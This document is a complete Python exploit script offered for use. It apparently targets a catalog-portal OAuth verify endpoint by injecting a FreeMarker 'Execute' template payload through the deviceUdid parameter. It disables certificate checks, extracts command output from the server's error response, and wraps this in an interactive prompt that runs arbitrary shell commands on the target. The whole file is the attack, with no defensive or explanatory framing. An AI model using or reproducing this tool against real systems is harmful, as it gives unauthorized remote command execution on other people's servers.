#!/usr/bin/env python3
import urllib.parse
import requests
import re
import argparse
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def encode_all(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def check_url(url):
	if 'https' not in url:
		url = f"https://{url}"
	try:
		url = url.rstrip("/")
	except:
		pass
	return url

def request(url,payload):
	url = f"{url}/catalog-portal/ui/oauth/verify"
	params = {
		'error':'',
		'deviceUdid':payload
	}
	headers = {
		'User-Agent': f'Mozeela'
	}
	res = requests.get(url,params=params,headers=headers,verify=False)
	output = re.search("device id: (.*), device type",res.text).group(1)
	return output

def main():
	parser = argparse.ArgumentParser(description='Process some integers.')
	parser.add_argument('-u','--url', dest='url', action='store',
			    help='Target url', required=True)

	args = parser.parse_args()

	url = check_url(args.url)

	print("Careful what you execute!\n")

	while True:
		cmd = input("$ ")
		payload = '${"freemarker.template.utility.Execute"?new()("' + cmd + '")}'
		output = request(url,payload)
		print(output.replace('\\n', '\n').replace('\\t', '\t'))

if __name__ == "__main__":
	main()
